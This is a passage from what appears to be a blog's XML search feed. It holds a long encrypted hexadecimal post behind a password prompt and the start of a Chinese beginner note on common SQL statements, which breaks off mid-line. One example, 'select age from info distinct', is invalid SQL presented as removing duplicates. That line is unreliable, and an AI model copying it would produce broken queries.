06ab98b389f5b771f04e91f8ef0dcfbfc3ffa4967105add1c4442efd00478d37e2d93e5fb51708e54e53bfc67a05bafd9f9004e7e17f556d08321ec970d6d7a54c90cd825f714875229a437b6cbad23c90821fed48b2520db36993871898e31ec8c0948e307e2955876925b8a4d151f52f5194627ef7d851ab9307ded41b11b48b918733d67b265b49b8f8c660f4a6dfeeaa71b74fd284cce5dfdeae8b2caea9756ca03207cd7b7d9e3ff77630145374e30f3e4c350089cbd7e7e4f3be54bd1d453d11e2452128069f8791facca7879826ff0294e9de8240cc1488c89f9fcac0e87b1408bdc63049b14fee725f2343abcaf041199a9cd39099f24d8621ac194adc381b55478af22f1d6c29e4fb289adf0f0995afdf126a584469d98acc2ccb67b1b7c05e20caccf820a07dd0ebc0e6b634cbe3c160ac1526be7f7e6337d2d363b398d17273cf31d32380c574d5d1cc84cd10581cf9e68050d9d1ee7f6ee92420bb561400122c9c461038af62cb81d1fda7565d4d5d1c99c4df32a1b702aa9246d0552b8d5afdf11da5ba20011f34adc1ed3700597c596e60911458c7e9d04b49de013ac3b72a80a985b4dd0c31b2f80fbc2a4d131a9ca033fb371ca203922722e42d564865aa4b108f821ca50adc05f82c4aefac69cf50a520c300095c9501f1e066ac199ee002da5bcd007ae71cf436e29e220c1c68226518c66c00825498c50753dd2f05fbf1828f465748adda1943a68ce4c991f62d53d045d57c3613092939a4d5a17a983d646f2c9ff777ad7931de473cdced12ddfbe180417c7160ca6ab97734d9bebe1f6cdd00da1c62a0abe9a2b04e343e6ea4188e07bc54d8e6f19d73b28dca8d054e3959abb83cca990a338177bb0522d8b8f09d65585a46e962854732d606617cb50829059309dd62685e46982e22bf02e4cbf85e49dc85492c39015223c13573d07b26c9052336317973dfc7f58b0999d604104af76fffd71d363cd0124a4aedca8b01b6870e8a4e6fad2329e45a463a16db9741857d3f73fd87dce6ae3754103490834bff29b0e2e6f05281887cd5ebef0f74a055beedce7ec68f2691699cfaf0eb9d6612d9b2db959debdefce197fe67113067339c44dbfa45f92f9c26cc5dd8906341a8e921c6ad75fcf54e4dcc1b1ceb8f2a2abad02cc339a9d8c4846d85bc3f64923fc292008cf88ec858f1a0134f29033fbc5db9e2020d541a51c028a70981f5276e58c5b2ad728860b4cdb35250b1905499358127f7cdbbfd3e35b036324aeaf4a07a6ede464162f3c78a5f7bdbce35d99f1e46fc69bf66158f90fe67bfc8401e72be36d110d047718441dc74355a46ae3a1aabddc739648b3119713be955e4548d6aeef1007c6632f844d9221631077fdaa8f1ef2e854ece8e17b1c905d0cb490486f0289e232c7a6f0f85c9b03f1b38bddd5d7dd7edb92fac14809cfe9f597df716aa8a3c5a778e5c51b38962e46f5dd6fd13136e69386b48462168bfcd481a460c8b15f6b5b7a0c2a044331b77436a463b4ed9f8a69b61cffdbb7c1ac59cbed470a3e191b39a6914b17107c42682812cfc43a88e33733bd6437eb9d65fa24cc9578d8df73c984f0849c81c28aaf88d2ace4b0a3b84d265939d001f05c953ce7c3e7d1601f33c4abde7528d6ead4ad2992ab10d3c67fb826258ff75d71bcf1eaec9482fe8a23b3251dac8f393280167dd26df2e5dbdef4faf82c2c3ed273a8e8255551836a908f4ccf46774353c2a75f48946952ee2eb1eaffe4741079fc32bcf806e550909ff98609ce5f9aa8a01fcb0454fd64b390d392cd1d578807177297d2c9f38b3dd2b5f1907f9fc3a44dfa54c265914d74c192ab35e5b064dab283d51f78bef35f86a88d11e67510558b6ae1ec992c13e54b8a67bed95256b5ef31836b0a3a92b807807593279e989356b1e45ca2ee0cae7ed776cf495921326f917926129271590288ad68e7b2253eb58f97ad53d1df85660eff7b3b625c89e0216f1315e29ec2fc079975fa4713c811084b98e8e4955a64741bf657deeae67abcc3902f3dc996ec93f84bbde25ed458b3fe385bd5a6e08b3a4c63ad85732dd219216b7fc69940fdeb1ab9e4c938152f58af09b7b291e23d3532be1d3a936ae78704413ffc0b8ca105b36c88a5fdcb60363997206319c75d1738a4ecbadb0d11981f0c5b67507114457ca2d38d1a1ae979409513fe507450192c3c01403b34936e74de09c3eee999f89254690714ab35b39361b8313bb850def3ad1bb64fa567a8517a9849bd78e71e2d8ddaa10a4f1d569cebf802781debe70b063259be7fd43278f35bae1294596375d5d7da0fccc84ed84128421627ae727fd9c7c879ae8e99cbccc467ec4a8aa602fb759eb20ecf2cd1ef8e7fc9716b1199bf9eb507ffb8ddcae8a426b5a866b1cde66042be2e4eb7df4de410c3db13776952e09d4274a1835ba64fa8f319f6088f46d3dd012c640f70fe6bba35b36e503261867ca77bb0eefeaf89bbd80946a2de7e98fe2e8c0163313094f0f4710a7cdd1d5d8d54e6c1f7089c9a62d3f77ee479f22edfdb19b34f0290151af4ada8d9964091dd738df053e2ae8faf8b81dcc810018805735efc257a0c11520f7c1968af524f0c3b2bcf2b47899b094673ca269260a40c7775da9cb3b0271e284196fa5c83ec35c2287381d40686a44300b2b29b9f7480d6e3937c972e0473efc585761599522b28a84ee3caa074569b3c7c88995857083365df0d479533665bd8c97a960650ee9ebe2c980791e46aae1d1efe5f2215bd778b12647290a3df3b1d3f4152203423c80460e8b0cf88a54273c9091e8a6d60f2bb95ca23b662b40a13ddb3facf636ebdf684b468a6100b2627366e283f42667f810bd84c21b446d0678dc2a9bf81b5dcea7b6a019f633503599069f539c5f5ee893bd784a255a659f0e452f8d7b056d1c1e099462bbc50d6ef35f17ef72e590acd4df0fd216b312f87702bc862077283b3595f49595d2d6dce7bab195791d21e6498196bbbed823a11eb3bd8116154ed5a146d3ca9e9a3d4f41f9286a574e7367a79d285f8b1491420f05a6e0531ff868d3c2867c89706c8886ccb8d6809b1c60920df29a8613744fac24592d2291c8af18a54ca9d399aa770ce124c26b8baf99e2bf49b8a7292b39046bc8b7a4e727f461097f191e5892fafe3bd0eea5794782f2e17176b5c3868969485d54a893c2e228484f16c0e5d4baf12102091acdc75232f0657582914bf9df1e6fa974885c4b7a1d901ab4e78a7e9599087a8f170535e377cbb334f14f710e0cb56b0b97be52b14dbdd762dd65c8408f6b60be2b9b1c21d6017cae484ffd658c14b254f0ed2118afaeec1cb89501fe98469bf31bdf9983aadd79eab8c654e0573908657b2a25058dcdb4b1e169d44b60ea8236817cb07b8320d2cc9b03100386d934490a384101e2976527a93ed17c0527698c22e3324f52eed2a8da8c063cf08d1b6a2361e181db4ff3c51a8f3c17ab0ef308328f977a151946546acce89437f3ab09ea4d4cee1fc170ebe6d46b239a17b3604cca7c8fbfe99d6f458a0067484fb95276e3370137363ae4d31d2ab11ffdef113258bc3d76d2f8098cbfdf3e40cb80b53d44be1e9145f2c5c0c6c8a7c7cce81e8d86bc4a369914a50c8efab2b9a5bd265e47369a8448514f2ccfe1219678d9d5629518bd7a021b2457667f6b95ae9adf40e1873714946b0ff42670d272febd5df20b1e2df7f3b639f812d1d498e872df083be418dc10a64f6513d8cf35ad5171682363fda427e3a1e60cb8f82ca3897c2c73ee1eb3a35b51c093e6dd93cc32d6d8c9ac9d6c51316245923f40c11a2fafdf6c25beecde51f4e0295e138b8d27b6c7589ad3e36b3f88cae1a8b7c30472c0838867339010febb499778a7bdcb8499a1dd149970182ec3fa5a12abbf1a2fed39b92198e75c5da5d78c4a9e132c055ffbda9ef5fcdb820994bc446362b26e4f735043742dcf7fa9632a843b1da6e32fa19a2870f4674aef67c53b0a7321762dd13cb5990e7b123cd0d0d222c2d046c1e2a9c72e13e2fff46d63996b40d52ab511ccb4b57e230714fdadda3d54e73d750982f4ad4a66d5883b9ffa5188ec3bf2348d0b8f712684b3142af9017f5b78f726de4465489665821c3c4aee597a457f7320036ce18f98d1f46974e1988d91d0980cc0b8ae7a3e3d9eaccbace59fe490164c2b4dc1d84dad5ee2d730985513d89234ec848e1eb35ccdfc1dc1787c6b4c37c63c7afa6932e4205d4b624550d92305b618bc732a2a8910740cc4144732268e3ffcdb4791e4f47b677edd8cb8f5fddfae38968ebbf99b623a65e2f8891df897fc9b48703f8e5866928ee5ae46a46788e4c22705cee0240af146c21bd5b908157a4d7742374a1d46f9d4558845f153e89b5b0005a4b7110639df6bb1b5571145ddd3d06ebf5db53e1b07ef58eb502ace211070d3eabbb514451bc2804bc94e1c3322f80f36f23c151edd164dd4a5adac4d236a9c6065893d2067176ac7d0f54e5a736452e044f3099adf6c49189484eb95532750d10048ed6a2ce2dac1a6621ae16354126016676eb11c2ea96630bbe1afa8c916fbfa53c61737948bbf6405a68f28f923a9886a8a4007028bb659d19e1d8632be791a76ed780c2e1691597f9a3f101f87828e4c813ba3f40a138176b13d3b6f6345174fce25bfd68a6e817f6c66309b59a1d2d0b9dd1c3db93375bf66b764404deefe2cecf91e1b30ce328f94d811af14dc0bf94fed0d6cb72703ac37222a83ccd801f38c8efe61639246cd22d8e1875ef49ea65de60b6164fb233d610805a3854216c08c91d180b768a2e7338b6ce0a4d39e3b413840d48707c2c47dc3b884056141fd1a73987930cfc7890abeb1871cdd2d13f6c7450f89bd8fd2eae49c98fb6513333605c14772fa81424ff37e43f605c6a24749bfcefde5cd65c90ded0cf90d2d2acc280323b2ec7a50e36b1d2199b4c9e18efe6e3afbc3624ce9b646751765f6946fab24565774d4706f8ac65ae1227821820137d10df89a96334acf57e20427b3a3c6752e3ee570a548001c0ef98ebcf6adcc963d16eae565be5aca5c1283125238d46af17007713b3211a290be9b7c007a2992cc04c8701539af89821dd4cf5eb12a002285921096702993944b5afd5361bbf81e8d89d7995531fdb55a90ebec10ed9a02f06499057f3151e6f0a67447bea0a2b6bf7845b8224820fa65d7f7f532027b43f113dac961ed881b2d7c0882ffa9dc04bb24a77844df231f473525e89132b47038e9cba4c809ac1616c12694f263d253c7fffd1b6ba47c5dece20e7136bbe4306490b9119da1b6c85b893364f5ab2ec4211d2a0fb3dd2dd9b58e84d212693c9206d992e4cd40ee03f2d4d57d79c7703b5982dca9b4f03b9f5bd7e683bc21e8b2f5a8c48406848e4cd8bc7ccc0b4fdf4d4f00232edc937407a2caa988a16dca2396d41bf650d3e2683525d0e60ffd0073a91bc794a890fbe41e0851935e2e59ecb2fc98b6265c93d0ff0006d13f7c100a457d248b604ba2ae03af0aa78aaafa79571904a996939757027ad44ffc68b26ae00101d1f51730cbea04151387a08b74bd4a223a7bc0b1b565a71a16395ee356e3abc172a74debd887cb6c2745a7e85eba7ec5f2992a4728163edb555ffed609815ec1e003771f229e97755f4c12606835efe19431072e6ccbc025258112ab75734c00b742993867c6e0a88f4941b169fe9ff7b3d53684c99c9722762a7fcde2a430c393d07ac6d9b040b48d2ae9a8c45408551f7f933b2e8b64161e5651f3257d63d6da218ed62c4d1a0c4bd3908318e1f48e9c0d5aea3a5a89130c9340a509c86e0bc753d1b6bbb8554a1dc307145b687d76321c054895f8e44d6f31ab7e6d04b2e284579017b915740f3cfeb3605e76a1d65320acc7493f73db04edbb263ca101c98578b8170668460156a96a344639e6ae506c73d925b3e38dd89d099d2649bbceab0d6f6210b4c28c9e6b7d0812f355f896044c503896212ec2d01cbdfd260a62fa662696c0efa9e10207be45e02d7b0d5cc654a847fe9374702e42bd21a8da18688a1b64017e473f70b2cedec4acb77565c973b66b81ff1c10b85c35d50a6cfde358f66a6b76a4b9d0fa398387cf0eba3b09e86260c6ccde7e7648db533db624b6d1dde55dbcd53edbcc01014f794aef29dd38eb1f079c7aa5cfb622747c45ef8d97158e4afdfeebc577b783a86895c8673732d26146b0b1ccf7d5f9ff3772ef2edabf67522fe5b8a18bbc473d9d62478139d6e35326265a1fd1ab5cb9792a4373a2d752cb96e9302ee0c16149b40c8fcb89337ff27f7983067b99f5d0b390e708c51c24d681d4cc02a6fd34af42f05009a0ca14b55816b1d96a8dfb0ad50cb50e7222ffa79251de99290fcc096338d4442df8d692db58c9585859e078d67aec57713cdaa8bd8039b4e39d3bd43cfc48f559cc14fc212effb29420a9615f71a4bc470889d638f6ebbe7af0ec7a3ec1f8fb71a65ee10ec49ba49bd4289f479268967d71fce09c62f9c73e5129a05b6aa58f1f300793d2e9385701dc92dd4e0d24cfe4034a274da7c6ac9af106b1f170e73bcb28f03262e2c92f66c8e5ea8a9f874b78198f4251236deac59e94016c844640fb6058da1acb35e939a9da31a59cc5d5d7dc10fc6613a54c508b227e2836ae36ddf00a5c74e89bcae7868405127a70cb2a0440afb17a59500eec06e55dad37ba699a2cc06f557044de6906c04a72a6238c57f135ca19357c120eee996e2811a9b59cb9c9172fae19b67c2db80ff33553051720cf32996299b97b03d583b20588f672ada03363c9bdfad7ade7f97d952e86bd8b8aa664f1ca8dba3f4affc6816d6fe7ae1aed0bbf2041978a995b0a6733e4227bf8b1ae592902593581724bccbae2ce23cde164018db4b2118f82a691f97fc06595b089d492bab62caf76bfdd2e9de531615d11a2fa8c3fd9eff46232f0f369080930f30daecf84dc52f307fe07806b8e01a512a4aea5488929b625ef09d12129ba01a6ca4802a4e744f8e8309e8b0f4907ad597075824452d7950439d8f8cfa136251bd3c687c76a2c7b3e1597c361f5e6f298c951c379e7864998745c07afe64869a29cdf953a877718ebb7354f72d39d94c651d0bb529ec8bc9e3f36a4da61b008e0fc55717a646125f29e6602f92487b3d73cd170ea89dde5f60096173f8a41e720863181f257979827d437f06306a73fa59dfe4708b5fc8011c952022a903b3581c3fb0defe81e7d4e35cf6d87aad43b59ba33d3365dadbf910274ba273e9e17aaf54751dbf1ee07413c7f24b4d0cfea30c08f6196ae45a8998498f4e4315e5d04ab20b9d1b86816053494be7738f3f518a28762392f64cc059ff8cf5979ff7b53dc224c82c0bbcecdf78466323e39102e64feef9ce1ed2939af612c6124457155538aee5142a9a3f6e82ea3fb17e474b937e3a6758d54ce218b9fe440baba4500a98aa55fd8ef01e63497fda9acb7a2dd2e35ac7323174b981261ea4532dc711d5fe2b182708965e6ec9cf78129c4f6489c827ab90f66d2fe2afdd32caa09af5860434abf886580278439a197f871134f8f4703e5073f8d61f072e11b4ba6283682db27c094cebfa9e6dd6ae46b4508032549168364572d4c01e44c85e5d3b2f61d02b7904908fe0f0df02e872d35afe328123174e21e41095c984521f7bb71439a5a32acc6808f4e886b73f25377be8ab8e0f37c2df8a4551727550d4047782032cad85601992f7053a14bfc86e9aae7599c3cd195cb56ef9dd1d3c931009e8cdd45077638411c3b5cad2faa687a64757cf2080368b07aac118d8cd40a16a0f74924729eb390a9b40807fafb79c32660de5cac39f71b4f2779a88af9503511c697c30dfd7b0f466924b96220f9e8856a653bb6bb8631ead1b9811e2dd3f785dedaaebf7619cbb088efb7e7bde08b9e463697f02c6e255b7aa500df12248d91c37c2f3243a2b7369f143129a812a0d129624dc634b3f56d7005eeda096ae4582ba64655f5f0696f326f40357ce23122260875828bc9e4e2641df25ced1dc6d83d372b2cb493c1933a7c709601ea4b0cfee215cf492566175ddfdc8d7ea52e66f74fe87fb5a6e77129a0d381d168e20b8847bce1fe81b16416a693c056dcdd7ba457abf8486e1d05473c731dfab5424a81170e557185465c6f79e1119d67b7dba37328ef837772e8ee6255705c9f0d8f955c0d8d4e9fceff0c528e40fedcdc36ed14d0ce6d8b9fc4b2f92b3c3bf6c0f3ec678feb34c30c578b3fb1cd6ba124aa11021953cd9b7a489d83ba2b61fba293ee194e17e7a66a09c25d77ee489b84479cbe57378239cafefe913a095c3641d6a67ae106d7c3dce88f110c9b9b1cdfe74bc897d9fb0cca417b71f8020747f591830f12a48b1c32d3c9ba8dd7b43c33c6d5d59d8ca22ac29feb8318a2f14b32badde7710569001327a48f73e236832e2376df2d39e0cc8caa925ca7bdff5215a1d17525664e97ea9e62c62f382254fbc189236f9a48179a66e675f05b6d09f721a55218f54c1db104e906de85352de8f606ce80f877e4ba441ab2fb2e5d4c64566922b97be403e35ebab41b8e82b90088cfcef339a51be90929034f3d7a2906c206ca11f47e5ea207eb8eeffddaf70d961baf4d362448831f1fef901db79b67a867c79c62662686427677fd5f7a19e697f6992c36d62fdf4b439270ca906b382a66862d68939d12b92c9f8033763b31b8bf0dadfded6279f82ae818fb1c5c76afb6788af94683e6b435cfd51264c7e5e07199bb8d5088c615b3bbda902fab56d37364aad4a6ed1df150dd4714c56dc9c6c0a5e673fc17d0a3136b3fe076fe83838210764daa567e2249d1189639748d665a5210f54525a811b9cf4747e3dcc9c65f3f79dd28dba260d676b8067ffa777779a6a7a0e9a6644ca0bd5cae2016951f1cf1f4346e3930e2c98bc535b8e37d8bf8e6b4304563761df5205597cc7fa5fa3a285689f316ce37870b0245a332403be94bec5039ccc627d6aa9d10bae7a057c0ccc3787dad9bc238f35a5a3a0735789a0ffc5d56591da280042a74eb6b5ecd2e8791243acba70d7c7b5e919b618712eceb9965cae2faaa33accbc2b798646d9797c90f913d55fdf0016981c485480721913454d31d770ba220e084749010a59f5c0345a24734b356c3a697b707c652a14570dcb88e03f564db2a7ab20289b4dff77df130d1ca6a4ffc33abb1d22204a4e0536651f1d2e442b5a448f7563f206b2031e1e1510567e5bc61aa57438ba9c482044ece84d9de4505ec682c737bbac76f65e01d41fe9d62d6394dc28b9e425bd8246ff268bd75d95d74d501d968a5669eb9e11eaa7984e5344e50ec54ce38edee10decf45c9d4d0ca1031136244eb015ef4a7aac31404b04859f85739cce81e58ee4ba62b51e7da403ce88b6932f0de585e1ffa46ac54b0becbde7b2050639514e6bd82daeb55b6eab0a58652b7e9d3755a18641d004c0b653fb7499344025cfdfa27a695cb0398c3018208d4ea108452416ba5275172436c004216a4dcfbda2f6d1198478816857c795600559d3915e20f0ca2433765548aa1bb3bb12cb695d981de8403cec17f53526e68f1b6b5d3f5f5c355a98aa61d471a222e26db6e6c60311c72f0056d1acb50bf1d15d91f54eefa0eb067a38615e9c01c740e7f89eb373e177b772fb0d1c37128cf2dc45c8fdaa1966a273bbdc1b48fd1b8e4c6e68a0edf61c05d55a4d4520fc821585332c7383e212d3b96768444dfa9ae49d7ef9c9123bed9dbedd842134e8e3822e989b612a79fa1ecafa95f66c0eb2b1229cf985e2ee131399030cb933032374c9e0e1f5c943a3ebced5a4bf7fb4b4be6c2273e3e1e8abf418e198698ccca6ac0a79b6e841a245696ea8b37e4fc4a32be818137cd6e92c6393d66050e47abafebe034bd65658399642dbc1543a5c9bf34df9b21b70c34fc5d2da0e080bd5a1597998fe451791cc275fcaa90f5dab56431738f0b5e035a7daae38f6c3e090b6be4accd8b196b903791c16e390b7a514dcbd9f429cf2c57f1f6b8db2c85f9a0a09145c9a46875a04fc0d76cecfb25489202d0485f4543498076f42e8d1394b85dbd933dabe4ffbc77c36b54e17fffa69484e95a96a1e08c20d0dbe8ea370de8e6b22b24b5934480c7475d73e45cf74cac8f0d4aa9391eda6f55cb3ee81076300e4619d0d30d3c592f0192d132178374490acc4885bb641285c4730b7ceb3ce2ba5a7b7f95474b35cc353c90c6bf16c89f422b16a57c9ec8ae57c8b2d06ce81a7cbe09a8d1110a257606301696a755a985e3bf7ce0add05ee351332aba55dec98a74945b4336485aeed3adcbb2b0e572e390238d7a1dc87a991b9794d64c2526317f1aa52c38459935d60bf33fcfcb55fee0dcc257b345116f2593334d110b4e06bb225f3bf20ad6424a0790bba6fdd3a5e3159b7f4b0caf79b31679815758545dec65b718ad57451dc7a7eb5d6e1e1f3c3aaa7c0f151c31258250c3b0f9c60f7b2fe9d1bd3c7dcc9df22fec2570875c9bcc066f62f4683c66dc63adc6d88ecfaeba6332f4a90a9134b767727dab5a49e8b0d80c822fe1120ebf2f10d8d7bd8146100ceb8f0927b8babce4ab9a19d6c8a1f0ae97bb0f93c55eb63793330d5cf3dfeb2435febf80bc7c8fcba91506d94b1d3d73b80e61544e1dbde7abed4eac26735f1ed8dc60b14c54fcdb38adf6a4887284c6fcf48ba7f5da2290dd8fb9b637035efb208e2ac1e594c536ac629db2d64390ba3386d2988e4069dcccdf11f24e047b32e16a1aae61b02362ef2e503a54847130a718b2c41ee89f7925ae9d540270e1cad4a07f22aeeddb5e4f2635ddf9731df06061ea7fdd9bd7ce398d853da07547b7cc15dd47d43df0fcd7a1e3981013111560b93691b2f37a5532ec759b84e68f310753e20d58b68719833fa196cd526931d8610d6305c5459329bafa2d10648c38888e5a0d841bfb29cc76c17a068534c2691fd1345075bf105c0d1a3598178d40d554fde9319a84d6a5419f63cbd166aadc63149e7186214fac620cb11eb7cea23789b8f3ed9ca59b1218a3d3b963290edf51bbbb4f5d58e28d0691413fe9c0c65ed716398561c14d5ccbe6d6c1b76bc0e046a01fb85eae1f8f4b38ed29e2b307bb8f844b4d06e0e4fdde21c070efb8fac39e6e49cd5344de14a129fde84ce08dfed49571a2233d295504118afb7657f0dd718b004026569fef6f976b10f06b4450d0f3eca2e54784b11a83968a2c4b06155cb7473e2a99b9ebfe0ba55384ff6f2243fabce0f922088245a8644177d4586a25b6beb72cead2055220fa16a17cb1f0e7d999835dc9040b4f5549f64e24963d7c15b25c699c9d9e7c6e3aab0c6270c5c9069ac1ead6302f2cee4dc91644f528a2494709ee6d2aa887e3c57d2b9669d3177cf4ffd27c15c0e372ff725cdc340e53aa1abd681ab532d0a1dea3d45eb244db05f774caaaf18597fd2e24a6665e8d5cab1a2161e7367c7d9cfd3359182c1216d063df68da53cb3a63d1a5bedf4745b3e0299f7628d55bedd9ff61797aed8b17a03cb53bacfdd087e260edf807af825fed5941f875c24791d98b2f6c0b88ab9b8d84d4313503d1c58822dc4821cf70d388f74f17543bf4d6c8210be1778406435ddd097fd7bf502675ebf87820673dc6bdb027f5c6439bcf9b9b99d3c6bfb0f997a276e7fe13672e391fa86e2b8aba3fcb82d10c60170d237b9e7e7dbe41483f5def709ac83466b8d769b970976d05558d706d127a72d4c6516af17ab19769b904fc8ccbfa8577e311909f22334f7607ff7222b6847a1e73f12cc494d944d3ddbc9f05887383fe261ee9177c67faf9e0827a3de84d4d2dbb99c0f20fff008d72f01efa5c5d73768d3a60ac17c264c9ef9d8ff899239b91734d4c0fb802e1b4b0098588ce385c206781dbaad72f053e8afe4a435165fb32c28623067e60c8e0b847ef43284d9e418d6a89091584a19cf14164ec4bc173cb6d146be1e39199e65130ddf97514d54733bf45359a93af502920777ffdc242a2a0112990c4ffd0da5d6ff88a6118b12991a8a3f3c98b27c70223ed0c111cfe5d30290385da9ba43c0b21a6451088c2407c502c1c170eaa6867bc2b6f9d411caae84dc06bc75b33eb3ae370b4f1bcf6645a4974e7939368ce94dda1f395dfc8dca0fcf06ce13d1109e343e103df518f6731c70e4361b68fe168e2450a1bfdc0dd07db92d685f89dc9d2d9ede0da9664b763589f7526db7fd542271d5bd57894240a8a03ec7240b94ee9ec1edfb894d186801422a3d0dd99ede5528a8ee07256006565c81b70dda117eb164381f099e9b862aa7926ba142f7d70d0083d984b8e820e91e90dd632bd6802982a7c88ba70b0ef096dc23e4affec455b93d7abf560f2f66c557caa62a55e9798116e89f637ac3cfd957e8b25d51326f295d5c8dab31b32bada7493f3c3a1e346fd174b50d6a0e8a41a8a24265bac56d5d0d8c47b56484a013bad1a3ef74f11dcff0e6a82c5850ea22e3d55ce2e306641e75c2ef04af662b83af133ef86394bb2099ce3af6090238aa42000dccac4bb9ad1102afd144dc9f1e1c16f334e304b5597c382a841f3933b044e3ac4106fc2ddd02b1bef43e6313cd23105fcb3914660302c046bbe70c9bff7aa40784c49564d5e7433cc665956985c68fa5339c65b17f38f15d34132356908a589ad46961a1f42d3fa9090a671bd2f99cc07bc6ea4e7f1c332e46fa68638eac6684c34a5b74ed2a3ddf26ae409bcc84278be93e635c42c854e0f93e42fe53787c09f26a304c58de3c16d491aea9ce31952e7d84691722bf3e88920f23db91f3312611b521787ac91921020372d16edf2a6cf7de4fc2e2094914e26f5155c6b63779e086ab9d54895f5e2ec1afed251c36919d6bfdd0f8c9e982dfcbd874ce15e78c3acff09168b0c840fb64728009eacd99010f8ec5b644ecb745dc71c889015b80503f4cda5bb0feb103944257f9ec7498bbec1cfcb91cc6ad6fe0d4eac2278ff6685fd7e5f27ee41d567b629644daae05f526e821b0b0acf4d9d1f07bc2e759e728a69af9bda27b382f22b770c44ed87a20f828733c521df1b1cf96a81775b544ac916ccc90af9550590cfbe3c4c05d076cf50bfb2001e5e0beec23407ef32f2243d08ab3bb0d13a43c629769064ce69c2855c62324b2547ed774e7b2fb755bae663a0c34bf5212588915be829273f5f1957e48d347df467806663f06c426faca666c4b1850a5fd4ac8f8527266694de8c0689194acfdcead8be7e7a8f005f08ffc628938eef84232563b251341dc53d73dfa1c57c86b1c4fc1a3bfa2d925b806f9c4ec6b9dfb3fdb39461abfede1c494f1432f1707aea5cd44c89f5bf1b1418224134d4efc82aabc69fc08bec0ff7bd56af90032dc70c8fae280071a4735f57dc590085779f693465a9f71b87f598e608b2462bd291676476d1091c5b3825abffe5718ed73c9e010f1415a119c4c218ff9e7cfe16e73626a9d40966676b62bb5895d74a9f960d0994550bbeca8f8a854f9aa861b4275d64bf235d9968e8b9c5f901c4eca9c2310e16db0e3b3646685af2c9d8613644fcb80ac19d4a34b05a69a4d327d484bf25cf14d916a94ec5663247fa6318fa1e3f6a931e83e46b6e1049de2c4c9c70a2570ab4bc509ddc284e04f9404b5f67fdf45526cdd33adc86adc53c4b911118689f794137eb9e97a6eb3568d5d34fc80338cd7935447bbb1a5f2f6dc27765c348ed1ed48102898c68c9a8180c7c39c82749117abde48ed1aaae7c28a4a8c10b55874de3fe2edc8983057d57876492ab588eb208a2beb62e7f03c85249062aec4cc1f7316981a81678dc3571ca4f0b507c69281a3e1653a0a47e6c3e0887c507666ef21c60088d273c91db212b7ddf475ba251ecc1598c4ac97c20ede4788f8b7841ddd5becc864b1ae10b0795838105fb8547111459900274a484a489140c8662bb57f89fabf632ed0b093a1f98b18406c9e900e288601ab7d47752309b54e486cd2c085811a4b65fb7fbae48d2fc3d07eccef8deed4c33e4044d2af48e587466cd92dfbe7cb0cead7cdbaf0e4b43596fdc84cb524a81b45e378ba90c71970eb405ae68f67c9e4d5666f21e23f7011db83fe56367ca513d3da9337ac370f1b0158f4e8f7bf9a295af02d883a51c0866c3bd154925af302d85c638f980c66f641c5de67e11eec090288df6fa5616e4f48dec40b8cb412d055fb6b4d506da4daeb00cfb29aca11fb9d99c3117eb3298763c8d365c87feddd1aaee694386aec76a81ca1a8923f114ffc19d4006b572e9b81c7b8fabb2d5157015ac1b1fdd4fa02ea24f1eae00fa6f4b9a47b76b0b382c8e0481b1f7e07d63f11a0d1c87bd5eccc6a2e742bfcbda24457eb32868ae837018521eda6fe4be70fbeb1be579cf7616672dfa723c325034bc0b2e2b3555dabf1344c3b75c928df96d28df28993b3fb24ba2a3ac6d32f1b9d91fe0b3cfb33d089364f86b6fc0e6e77c2ce5d959d8e5bd6d5a0b8977245aa9d8695ad6f8c7a5e569bbdfe1dac09335ef8bff62101307f2d4da2dc1e71aed5794ba69ab22c57f49a239d6595064938d4297db22256d4e0e7ff9e73593ed44d8747b5ccb908a96ea66a09b131158f77906caf892fcc5b699345b3f27b62a0138ea5038bc2dca5fd1d971eba331d44c44721eb2ec9190469d1780ab7f080b51b3f4d65577ada856cb8ed84b57f837abc8b3ebb5434a0ac17b9b5995f099dc76c4e698166bc03a3901f565ad6696911405499d056c99066f7fce004fe901ed2a35e65d88ef886a1ed2e32c0cf20e5b6117ca6e7123a7ee542c6d5f1c936ad7cfc16549c1930f270d86a823db45a8eeb15a8e8ba568d9159720b63779a560627d74a47060e57ea9f30738b2baa1acd5fabcdcbc9dfaeab36efcd0c99bdfc6c8a2ce45f5fc154ca288b683d3a380dd1649a27750d0981a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL常用语法</title>
      <link href="/article/a9010216.html"/>
      <url>/article/a9010216.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database users;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> info(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use users;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">where</span> age<span class="operator">&gt;=</span><span class="number">18</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">distinct</span>; <span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>; <span class="comment">-- 